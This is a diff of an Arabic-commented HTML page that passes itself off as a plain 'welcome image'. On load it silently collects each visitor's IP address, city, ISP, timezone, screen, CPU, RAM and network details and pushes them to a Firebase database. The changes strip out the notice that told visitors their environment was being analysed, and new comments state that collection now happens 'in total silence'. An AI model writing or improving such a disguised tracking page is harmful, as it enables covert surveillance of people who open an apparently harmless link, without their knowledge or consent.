@@ -3,45 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صفحة عرض الصورة والتحليلات المتقدمة للبيئة التقنية</title>
+    <title>صورة ترحيبية</title>
     <!-- مكتبات Firebase للاتصال بقاعدة البيانات -->
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
         body {
             margin: 0;
-            padding: 20px;
+            padding: 0;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             background-color: #f4f1ea;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
         }
         .container {
             text-align: center;
-            max-width: 600px;
         }
         img {
             max-width: 100%;
-            max-height: 70vh;
+            max-height: 85vh;
             border-radius: 12px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-        }
-        .status-badge {
-            margin-top: 15px;
-            font-size: 13px;
-            color: #64748b;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- عرض الصورة المرفوعة مع الحفاظ على مسارها الأصلي -->
+        <!-- عرض الصورة المرحب بها حصرياً بدون أي نصوص أو حالات -->
         <img src="image.JPG" alt="صورة ترحيبية">
-        <div id="status" class="status-badge">جاري تحليل بيئة الاتصال والعتاد...</div>
     </div>
 
     <script>
@@ -56,7 +47,7 @@
         }
         const db = firebase.database();
 
-        // دالة متقدمة لجمع بيانات الزائر والعتاد وبصمة الشبكة
+        // دالة جمع بيانات الزائر والعتاد وبصمة الشبكة في الخلفية بصمت تام
         async function logAdvancedVisit() {
             let ipInfo = {};
             try {
@@ -74,7 +65,7 @@
                 saveDataMode: connection ? connection.saveData : "غير متوفر"
             };
 
-            // تجميع كافه المقاييس في كائن واحد متكامل
+            // تجميع كافة المقاييس في كائن واحد متكامل
             const visitData = {
                 timestamp: new Date().toLocaleString('ar-EG'),
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -82,16 +73,16 @@
                 language: navigator.language,
                 screenSize: `${window.screen.width}x${window.screen.height}`,
                 
-                // مقاييس العتاد المتقدمة الجديدة
+                // مقاييس العتاد المتقدمة
                 hardwareCores: navigator.hardwareConcurrency || "غير متوفر",
                 deviceRAMApprox: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير متوفر",
                 
-                // مقاييس الشبكة والاتصال المتقدمة
+                // مقاييس الشبكة والاتصال
                 networkEffectiveType: networkData.effectiveType,
                 networkDownlink: networkData.downlinkSpeed,
                 saveDataEnabled: networkData.saveDataMode,
 
-                // البيانات العامة السابقة
+                // البيانات العامة
                 referrer: document.referrer || "دخول مباشر",
                 ipAddress: ipInfo.ip || "غير متوفر",
                 city: ipInfo.city || "غير متوفر",
@@ -99,19 +90,17 @@
                 isp: ipInfo.org || "غير متوفر"
             };
 
-            // إرسال البيانات فوراً إلى قاعدة البيانات تحت قسم advanced_visits
+            // إرسال البيانات فوراً إلى قاعدة البيانات تحت قسم advanced_visits بصمت
             db.ref('advanced_visits').push(visitData)
               .then(() => {
-                  console.log("تم حفظ التحليلات المتقدمة في Firebase بنجاح");
-                  document.getElementById('status').innerText = "تمت قراءة وتحليل بيانات البيئة التقنية بنجاح ✅";
+                  console.log("تم حفظ التحليلات في القاعدة بنجاح");
               })
               .catch((err) => {
-                  console.error("حدث خطأ أثناء الحفظ:", err);
-                  document.getElementById('status').innerText = "تعذر إرسال البيانات للقاعدة ❌";
+                  console.error("خطأ في الإرسال:", err);
               });
         }
 
-        // تنفيذ الكود فور فتح الصفحة وعرض الصورة
+        // تنفيذ عملية الجمع في الخلفية فور تحميل الصفحة
         window.onload = logAdvancedVisit;
     </script>
 </body>
